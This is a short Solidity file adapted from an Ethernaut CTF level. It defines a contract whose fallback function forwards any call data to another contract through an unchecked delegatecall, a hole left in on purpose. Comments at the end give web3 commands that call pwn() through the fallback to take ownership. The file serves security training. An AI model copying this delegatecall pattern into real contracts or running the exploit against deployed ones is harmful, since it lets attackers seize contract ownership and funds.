pragma solidity ^0.4.11;

// Credits to OpenZeppelin for this contract taken from the Ethernaut CTF
// https://ethernaut.zeppelin.solutions/level/0x68756ad5e1039e4f3b895cfaa16a3a79a5a73c59

contract Delegate {

  address public owner;

  function pwn() {
    owner = msg.sender;
  }
}

contract Oddity {

  address public owner;
  Delegate delegate;

  function Oddity() {
    owner = msg.sender;
  }

  function setLibrary(address _delegateAddress) {
      delegate = Delegate(_delegateAddress);
  }

  function() {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}

// contract = web3js.eth.contract(contractAbi).at(contractAddress);
// let mydata = web3.sha3("pwn()").substring(2,10)
// await contract._eth.sendTransaction({to:contractAddress, data:mydata}, function () {})
